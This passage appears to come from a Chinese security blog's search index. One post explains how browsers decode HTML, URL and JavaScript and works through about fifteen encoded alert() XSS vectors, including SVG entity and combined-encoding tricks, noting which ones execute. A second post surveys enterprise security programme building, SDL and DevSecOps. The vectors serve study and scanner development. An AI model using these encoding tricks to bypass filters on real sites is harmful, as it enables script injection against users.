当浏览器从网络堆栈中获得一段内容后，触发HTML解析器来对这篇文档进行词法解析。在这一步中字符引用被解码。在词法解析完成后，DOM树就被创建好了，JavaScript解析器会介入来对内联脚本进行解析。在这一步中Unicode转义序列和Hex转义序列被解码。同时，如果浏览器遇到需要URL的上下文，URL解析器也会介入来解码URL内容。在这一步中URL解码操作被完成。由于URL位置不同，URL解析器可能会在JavaScript解析器之前或之后进行解析。 Example A: &lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt;Example B: &lt;a href=# onclick=&quot;window.open(&apos;UserInput&apos;)&quot;&gt;&lt;/a&gt;Example C: &lt;a href=&quot;javascript:window.open(&apos;UserInput&apos;)&quot;&gt; 在例A中，HTML解析器将首先开始工作，并对UserInput中的字符引用进行解码。然后URL解析器开始对href值进行URL解码。最后，如果URL资源类型是JavaScript，那么JavaScript解析器会进行Unicode转义序列和Hex转义序列的解码。再之后，解码的脚本会被执行。因此，这里涉及三轮解码，顺序是HTML，URL和JavaScript。 在例B中，HTML解析器首先工作。然而接下来，JavaScript解析器开始解析在onclick事件处理器中的值。这是因为在onclick事件处理器中是script的上下文。当这段JavaScript被解析并被执行的时候，它执行的是“window.open()”操作，其中的参数是URL的上下文。在此时，URL解析器开始对UserInput进行URL解码并把结果回传给JavaScript引擎。因此这里一共涉及三轮解码，顺序是HTML，JavaScript和URL。 例C与例A很像，但不同的是在UserInput前多了window.open()操作。因此，对UserInput多了一次额外的URL解码操作。总的来说，四轮解码操作被完成，顺序是HTML，URL，JavaScript和URL。 HTML 解析概括 HTML 中五类元素。详细可直接参考HTML5 语法https://www.w3.org/html/ig/zh/wiki/HTML5/syntax 空元素: 空一字体现在不能容纳内容。一般的标签由 &lt;start&gt;content&lt;/end&gt;这样组成。空元素意味着没有闭合标签的标签。如: &lt;area&gt;,&lt;br&gt;,&lt;base&gt; 原始文本元素: 可以容纳内容。 &lt;script&gt;和&lt;style&gt;。 RCDATA元素，可以容纳文本和字符引用。&lt;textarea&gt;和&lt;title&gt; 外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释: 如 MathML命名空间或者SVG命名空间的元素 基本元素，可以容纳文本、字符引用、其他元素和注释: 除了以上4种元素以外的元素 上面的内容我提炼了较为陌生的专业术语 字符引用 RCDATA 外部元素 什么是字符引用？字符引用包括“字符值引用”和“字符实体引用”。如在HTML中，&lt;对应的字符值引用为&amp;#60;，对应的字符实体引用为&amp;lt;。字符实体引用也被叫做“实体引用”或“实体”——》再次延伸概念: 字符实体字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开始，后面跟着一个预定义的实体的名称，或是一个#符号以及字符的十进制数字。——》产生问题: 为啥我要用字符实体呢，要经过转义这么麻烦的操作 ——〉HTML字符实体在HTML中，某些字符是预留的。例如在HTML中不能使用“&lt;”或“&gt;”，这是因为浏览器可能误认为它们是标签的开始或结束。如果希望正确地显示预留字符，就需要在HTML中使用对应的字符实体。 外部元素容纳种类的比空元素、原始文本元素多，有什么用呢？Foreign elements ——》 SVG黑魔法&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 这个payload能执行的原因是因为 &lt;svg&gt; 遵循XML和SVG的定义。在XML中，&amp;#40;会被解析成 （。同理 &lt;svg&gt;&lt;script&gt;alert&amp;#x28;1);&lt;/script&gt; 也可以造成 XSStips: 在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体 下面开始进入HTML解析过程… 一个HTML解析器作为一个状态机，HTML解析器有很多种状态。进行状态转换的方式是从输入流中获取字符并按照转换规则转换。以 &lt;start&gt;content&lt;/end&gt; 为例子。HTML识别开始和结束标签的核心是 / 符号。当HTML解析器遇到 &lt; 且没有 / 。就会进入 标签开始状态 然后转变到 标签名状态， 前属性名状态 … 最后进入 数据状态。 并释放当前标签的token。当解析器处于数据状态时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 容纳字符实体的作用: 在这些状态中HTML字符实体将会从 &amp;#...形式解码。三种情况可以容纳字符实体： 数据状态中的字符引用，RCDATA状态中的字符引用和属性值状态中的字符引用。 有一种可以容纳字符引用的情况是 RCDATA状态中的字符引用。这意味着在&lt;textarea&gt;和&lt;title&gt;标签中的字符引用会被HTML解析器解码。且在解析这些字符引用的过程中不会进入 标签开始状态 。对RCDATA有个特殊的情况。在浏览器解析RCDATA元素的过程中，解析器会进入 RCDATA状态。在这个状态中，如果遇到&lt;字符，它会转换到RCDATA小于号状态。如果&lt;字符后没有紧跟着/和对应的标签名，解析器会转换回RCDATA状态。这意味着在RCDATA元素标签的内容中（例如&lt;textarea&gt;或&lt;title&gt;的内容中），唯一能够被解析器认做是标签的就是&lt;/textarea&gt;或者&lt;/title&gt;。当然，这要看开始标签是哪一个。因此，在&lt;textarea&gt;和&lt;title&gt;的内容中不会创建标签，不会有脚本执行。 URL 解析URL资源类型必须是ASCII字母（U+0041-U+005A || U+0061-U+007A），不然就会进入“无类型”状态。例如，你不能对协议类型进行任何的编码操作，不然URL解析器会认为它无类型。 JavaScript 解析Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。javascript解码器无法试别编码后的控制字符，比如：单引号，双引号和圆括号，之后会用一些例子进行详细说明。 Python 转码脚本自己最近在写一个XSS的扫描脚本，其中一个模块具有判断 XSS payload 的有效性的功能。这里给出部分转码片段 import htmlimport refrom urllib.parse import unquotepayload = &apos;&apos;def decodeHTML(): dh = html.unescape() return dhdef decodeURL(): du = unquote() return dudef decodeUnicode(payload): duni = payload.encode(&apos;utf-8&apos;).decode(&apos;unicode_escape&apos;) return duni 从payload看解析流程1、&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;不弹窗， 原因: 识别到 href ，属性值状态中的字符引用。进入url模块解析。URL规定协议，用户名，密码都必须是ASCII。且不能对协议类型进行任何的编码操作。这里的 javascript 协议无法识别。 2、&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt; 弹窗， 原因: 属性值状态中的字符引用。识别到实体化编码内容，进入html解码得到 &lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;。然后进入 URL 解析。此时可正确识别协议类型。解码得到&lt;a href=&quot;javascript:alert(2)&quot;&gt; 最后 JavaScript 解析。 3、&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt; 不弹窗， 原因同一， 这里 javascript: 为协议，任何一部分内容都不能编码 4、&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;不弹窗， 原因: 属性值状态中的字符引用，先进行 HTML 解析。但 HTML 解析机制中&amp;#60;会被 HTML 解码，但不会进入标签开始状态，当然也就不会创建 img 元素。(HTML编码就是为了显示这些特殊字符，而不干扰正常的DOM解析) 5、&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;不弹窗， 原因为: &lt;textarea&gt;是RCDATA元素，可以容纳文本和字符引用，注意不能容纳其他元素，HTML解码得到&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;但 &lt;textarea&gt;只容纳文本和字符引用。因此js无法执行 6、&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;不弹窗， 原因同5 7、&lt;button onclick=&quot;confirm(&apos;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;弹窗， 原因: 属性值状态中的字符引用，先进行HTML解码。然后JS执行 8、&lt;button onclick=&quot;confirm(&apos;8\\u0027);&quot;&gt;Button&lt;/button&gt;不弹窗， 原因: 在JavaScript中，标识符只能包含字母或数字或下划线（“_”）或美元符号（“$”），且不能以数字开头。 onclick中的值会交给JS处理，在JS中只有字符串和标识符能用Unicode表示，&apos;显然不行，JS执行失败。 9、&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;不弹窗， 原因: script标签属于原始文本元素。无法容纳字符引用，所以无法进行HTML解码。因此JS解析时并不能执行弹窗 10、&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;弹窗， 原因: 直接进入 JavaScript 解析。且发现unicode编码，其为 alert 标识符进行编码后的字符串。所以能先解码，然后执行 11、&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;不弹窗， 原因同8: 出现括号进行了unicode编码，JS无法识别编码后的控制字符 12、&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;不弹窗， 其实个人最开始看到payload是感觉能弹窗的，后来参考了别人的思路。发现\\u0031\\u0032在解码的时候会被解码为字符串12。需要引号包裹。因此不执行JS 13、&lt;script&gt;alert(&apos;13\\u0027)&lt;/script&gt;不弹窗，原因同8: 出现单引号进行了unicode编码，JS无法识别编码后的控制字符 14、&lt;script&gt;alert(&apos;14\\u000a&apos;)&lt;/script&gt;弹窗。原因: \\u000a在JavaScript里是换行，就是\\n，直接执行 组合拳:&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;/a&gt; 先进行HTML解码得&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)&quot;&gt;&lt;/a&gt;然后进入 URL 模块处理，发现完整 javascript: 协议，进行URL解码。得javascript:\\u0061\\u006c\\u0065\\u0072\\u0074(15)控制字符 ()未被unicode编码，因此进行 JavaScript 解码，成功弹窗 浏览器渲染浏览器的呈现引擎呈现引擎默认可以解析html文档、xml文档以及图片等资源并将解析后的内容展示给用户。通过各种插件（浏览器扩展程序）浏览器还可以展示其他各类型的web资源，如pdf插件可以让浏览器展示pdf文档。不同浏览器使用的呈现引擎也不一样，目前主流的呈现引擎有Webkit、Blink(Webkit的一个分支)、Gecko、Trident、EdgeHTML(Trident的一个分支)。 浏览器 呈现引擎 Chrome Blink（Chrome 28+） Webkit（Chrome 27-） Safari Webkit Firefox Gecko Edge EdgeHTML IE Trident 页面呈现原理当我们点击一个链接，服务器将 HTML 代码传输到我们的浏览器，浏览器在接收到这份 HTML 代码之后进行的页面的呈现，粗略的说会经过以下这些步骤： DOM 树的构建（Parse HTML） 构建 CSSOM 树（Recaculate Style） 合并 DOM 树与 CSSOM 树为 Render 树 布局（Layout） 绘制（Paint） 复合图层化（Composite） 页面呈现过程中的阻塞 当遇到 JavaScript 脚本或者外部 JavaScript 代码时，浏览器便停止 DOM 的构建（阻塞 1） 当遇到 &lt;script&gt; 标签需要执行脚本代码时，浏览器会检查是否这个 &lt;script&gt; 标签以上的 CSS 文件是否已经加载并用于构建了 CSSOM，如果 &lt;script&gt; 上部还有 CSS 样式没加载，则浏览器会等待 &lt;script&gt; 上方样式的加载完成才会执行该 &lt;script&gt; 内的脚本（阻塞 2） DOM 树与 CSSOM 树的成功构建是后面步骤的根基（同步阻塞） 同时外部脚本、外部样式表的下载也是耗费时间较多的点 Webkit和Gecko的流程对比Webkit的主要流程（图片摘自Tali Garsiel的研究成果) Gecko的主要流程（图片摘自Tali Garsiel的研究成果） 参考链接从浏览器渲染与解码原理重新认识xss浏览器解码看XSS深入理解浏览器解析机制和XSS向量编码浏览器的工作原理：新式网络浏览器幕后揭秘浏览器内核、JS 引擎、页面呈现原理及其优化从Chrome源码看浏览器如何构建DOM树不同内核浏览器的差异以及浏览器渲染简介","link":"/2020/03/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B/"},{"title":"甲方安全建设的思路学习和思考","text":"对甲方安全建设的知识学习以及对未来职业规划的思考 Preface最近一次偶然的面试被问到了甲方安全，和面试官交流学到了很多思维上面的东西。 面对这从未涉足过的方面，我希望能先从互联网上的文章借鉴一些体系化流程建设的思路，学习一些方法论 当然在学习甲方安全建设的过程中我经常会引发一些对未来的思考 以下几篇文章给我带来的触动颇多： 在腾讯的八年，我的职业思考：https://yuguo.us/weblog/tencent-8-years/ 安全从业人员的职业规划：https://mp.weixin.qq.com/s/134C13nbVtJkg-MM0eRe8g 其中一张图更是引发了我平淡的学习生活中对未来规划的一个思考 此外，和面试官聊了一些关于甲乙方对安全的看法等等，我惭愧的发现自己一直忽略了漏洞的防止和修复这一个关键的点上。每次都只知道个大概，而真正的业务上的修复却不知道如何着手。我决定从现在开始改掉这个坏习惯。 安全建设步骤下文步骤转自 @pirogue 师傅文章：甲方安全建设步骤 资产梳理 IP列表、业务分组(负责人、联系方向)、业务属性 业务端口 业务应用架构、技术堆栈 边界安全，防火墙策略控制（需要梳理业务端口） 如果是硬件，使用防火墙统一控制 如果是操作系统，Iptalbes＋IPSEC 及时监控业务端口的变化（外部nmap扫描搜集结果比对，或者编写脚步放到运维平台收集系统监听端口和防火墙策略) 跳板机安全控制 账户安全管理 弱密码 root、sudoer权限 账户、授权、访问、审计等等 服务器安全 安全基线检测 操作审计 异常登录审计(日志收集分析) 漏洞清点/扫描，补丁修复测试和推进 WEB安全 应用渗透测试 接口安全(加密、通信) webshell实时监测 Nginx日志分析/Nginx流量旁路分析 业务风控安全 用户安全机制（密码、验证码、登录） 交易安全 安全培训 安全意识培训 运维安全培训 WEB安全开发 安全规范和流程 人员入职账户开通 人员离职账户注销 服务器上下架安全管理 安全应急响应机制 内网安全 内网服务器安全 账户统一验证和管理机制(域ldap协议统一验证OA、RTX、邮件、内网业务系统) 弱口令监测(NTLM/LM) 账户异常登录 网络隔离（物理／虚拟化） 网络准入 PC安全（病毒统一管理、通知处理） 关于一些思路这篇文章从多个维度讲解了安全建设的思考，个人感觉写的非常不错：https://www.secrss.com/articles/26532 一、安全与业务的关系 二、互联网企业安全建设整体思路 三、互联网企业面临安全风险与影响 四、互联网企业核心安全目标 五、互联网企业核心安全能力建设 六、互联网企业安全蓝图 七、互联网企业安全整体视角 八、如何落地实施 九、分阶段安全体系建设 十、做好安全建设的必要条件 十一、如何衡量安全建设的效果 十二、安全漏洞管理平台建设实践 十三、写在最后 另一篇着重谈体系化思考的文章也非常不错：企业安全建设的体系思考与落地实践： https://www.secrss.com/articles/11299 关键点就是对知识的学习、提炼、总结、分类，然后根据当前环境分析，最后解决问题 SDL微软安全开发生命周期（Security Development Lifecycle）简称 SDL SDL 过程图 更多参看： [1]【软件安全设计】安全开发生命周期（SDL） http://blog.nsfocus.net/sdl/[2] 微软SDL官方地址http://www.microsoft.com/security/sdl/default.aspx[3] Microsoft SDL 的简化实施https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=12379[4] SDL 威胁建模工具入门https://msdn.microsoft.com/zh-cn/magazine/dd347831.aspx 此外这篇文章 https://xz.aliyun.com/t/6625 在介绍 SDL 的时候花了很大的篇幅在讲 SonarQube 相关的安装和配置，没有接触过 SonarQube 。先留个坑。 DevSecOps根据网上大多数文章，我发现现在很多大企业都在推进 DevSecOps SDL与DevSecOps有各自的适用场景，对软件安全开发的发展都有着重要的贡献。 DevSecOps越来越受到周期短、迭代快的互联网业务的欢迎，也成为安全界的流行趋势 什么是 DevSecOps ？？ DevSecOps一词最早由Gartner在2012年提出，并从2017年开始逐渐成为热门词汇。DevSecOps可以理解为将安全性融入到DevOps的过程中，在整个开发和运维的过程中将安全作为一项重要的考虑因素，最终实现应用整个生命周期内的安全性。利用DevSecOps实现安全自动化可以在提高研发运维效率的同时增强应用的安全性。 关于 SDL 和 DevSecOps 的对比可以看这篇文章：https://www.secrss.com/articles/28407 业内首次对该模型及配套解决方案进行详细的分析，核心理念为：安全是整个IT团队（包括开发、测试、运维及安全团队）所有成员的责任，需要贯穿整个业务生命周期的每一个环节。每个人都对安全负责，安全工作前置，柔和嵌入现有开发流程体系。 详细一点的我引入 携程DevSecOps实践 一文的图 这一图大概的能理清楚每一个缓解的事项 更详细的可以参考云鼎实验室的图 以下三个例子分别是不同企业在建设 DevSecOps 的思路分享 OPPO互联网DevSecOps实践：https://www.secrss.com/articles/25053 DevSecOps在携程的最佳实践：https://www.secrss.com/articles/23728 DevSecOps在腾讯云的落地实践：https://www.secrss.com/articles/19426 DevSecOps的安全工具金字塔: https://www.secrss.com/articles/28514 安全测试的自动化工具链的建设可能是落地的一个重要环节 DAST 安全扫描自动化检测平台建设（Web黑盒上）：https://sec.xiaomi.com/article/9 安全扫描自动化检测平台建设（Web黑盒中）：https://sec.xiaomi.com/article/10 安全扫描自动化检测平台建设（Web黑盒下）：https://sec.xiaomi.com/article/11 爱奇艺分布式漏洞扫描系统：https://www.secrss.com/articles/12049 SASTSAST 之前需要了解代码审计 这一篇文章写的非常好：https://www.secrss.com/articles/13724 同时里面附加了商业工具的一个评测 思考和小结结合现状考虑，作为一个在校生，综合多个因素，在不接触企业中体系化的甲方建设流程情况下，我觉得可以着手的方面如下（其中参杂部分乙方视角） 当然它仅仅只是从 DevSecOps 流程中抽出来的几个板块，并不能代表整个安全流程建设，针对找工作而言，上面的内容应该是对甲乙方安全都有帮助的。","link":"/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/"}],"tags":[{"name":"Misc","slug":"Misc","link":"/tags/Misc/"},{"name":"漏洞分析","slug":"漏洞分析","link":"/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"PHPCMS","slug":"PHPCMS","link":"/tags/PHPCMS/"},{"name":"代码审计","slug":"代码审计","link":"/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Java安全","slug":"Java安全","link":"/tags/Java%E5%AE%89%E5%85%A8/"},{"name":"Typecho","slug":"Typecho","link":"/tags/Typecho/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"categories":[{"name":"Misc","slug":"Misc","link":"/categories/Misc/"},{"name":"Java安全","slug":"Java安全","link":"/categories/Java%E5%AE%89%E5%85%A8/"},{"name":"漏洞分析","slug":"漏洞分析","link":"/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"Web安全","slug":"Web安全","link":"/categories/Web%E5%AE%89%E5%85%A8/"}]}